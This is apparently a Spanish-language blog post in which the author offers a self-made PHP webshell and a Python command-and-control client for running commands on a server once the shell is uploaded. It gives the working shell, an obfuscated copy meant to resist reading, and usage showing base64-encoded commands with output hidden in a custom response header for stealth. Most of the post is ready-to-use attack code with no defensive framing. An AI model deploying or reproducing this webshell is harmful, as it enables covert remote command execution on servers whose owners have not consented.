# WebShell

Os presento una pequeña herramienta que os podría ser útil.

Se trata de una webshell en php creada por mi.

```php
<?php
$v = 'W3lc0m3!'; $s = $_GET['s']; $c_d = base64_decode($s);
if ($c_d == $v) { $c_b64 =  $_GET['_']; $cmnd = base64_decode($c_b64);
$opt = `$cmnd`; $opt_b64 = base64_encode($opt); header('x: ' . $opt_b64);
} else { echo ''; }
?>
```

Esta pequeña webshell funciona de la siguiente manera:

En el código se ha fijado en una variable el valor de un “secreto”, en este caso `W3lc0m3!`. El funcionamiento del script solo funcionara si se envía a través de un parámetro llamado “s” el secreto encodeado en base64, de esta forma: `https://localhost/webshell.php?s=VzNsYzBtMyE=`

De esta forma, se entra en el condicional para que al añadir otro parámetro llamado “_” se ejecute el comando. Al igual que el parámetro anterior, este tiene que enviarse en base64 también, de la siguiente forma: `https://localhost/webshell.php?s=VzNsYzBtMyE=&_=d2hvYW1p`

Esta petición ejecutara el comando `whoami`, el servidor añadirá una nueva cabecera en la respuesta del servidor llamada “x” con el contenido del comando ejecutado en base64.

De esta forma somos “un poco” mas sigilosos y no hacemos tanto ruido en el servidor. 

Añado un código php ofuscado para que sea mas difícil la lectura del código.

```php
<?php goto HfT43; Occd3: $c_d = base64_decode($s); goto qJGNO; jda1x: $s = $_GET["\x73"]; goto Occd3; HfT43: $v = "\127\63\x6c\143\60\155\63\x21"; goto jda1x; qJGNO: if ($c_d == $v) { $c_b64 = $_GET["\137"]; $cmnd = base64_decode($c_b64); $opt = `{$cmnd}`; $opt_b64 = base64_encode($opt); header("\170\72\x20" . $opt_b64); } else { echo ''; } goto hDgCE; hDgCE: ?>
```

Una vez subido la webshell con éxito al servidor. Podemos utilizar el siguiente script de Python para ejecutar comandos cómodamente.

```python
#!python3

import requests, argparse, os, base64, binascii, signal

#Colores
class Color:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

# CTRL+C
def def_hundler(sig, frame):
    print(Color.YELLOW + "[!]Saliendo..")
    exit(1)
signal.signal(signal.SIGINT, def_hundler)

def main(url,secret,cmd):
    secret_bytes = secret.encode('utf-8')
    e_secret = binascii.b2a_base64(secret_bytes, newline=False).decode()
    r = requests.get(url+f"?s={e_secret}+&_={cmd}")
    if "Passing null to parameter" in r.text:
        print(Color.RED + "El comando no es valido")
    else:
        output = base64.b64decode(r.headers['x'].encode('utf-8'))
        print(Color.BLUE + f"Comando ejecutado: \n")
        print(Color.GREEN + output.decode('iso-8859-1'))

def usage():
    fNombre = os.path.basename(__file__)
    ussage = fNombre + ' [-h] -url <URL> [-secret SECRET] \n\n'
    ussage += '[+] Examples:\n'
    ussage += '\t' + fNombre + ' -url https://wordpress.com/ -secret secret\n'
    return ussage

def arguments():
    parser = argparse.ArgumentParser(usage=usage(), description="Python3 C2")
    parser.add_argument('-url', dest='url', type=str, help='URL')
    parser.add_argument('-secret', dest='secret', type=str, default=False, help='Secret')
    return parser.parse_args()

if __name__ == '__main__':
    args = arguments()
    while True:
        cmd = input(Color.RED + "> ")
        cmd_bytes = cmd.encode('utf-8')
        e_cmd = binascii.b2a_base64(cmd_bytes, newline=False).decode()
        main(args.url, args.secret, e_cmd)
```

El uso del script es el siguiente:

`python.exe ./webshell.py -url "[http://localhost/ofuscated.php](http://localhost/ofuscated.php)" -secret W3lc0m3!`

![Untitled](/assets/images/WebShell/Untitled.png)

![Untitled](/assets/images/WebShell/Untitled%201.png)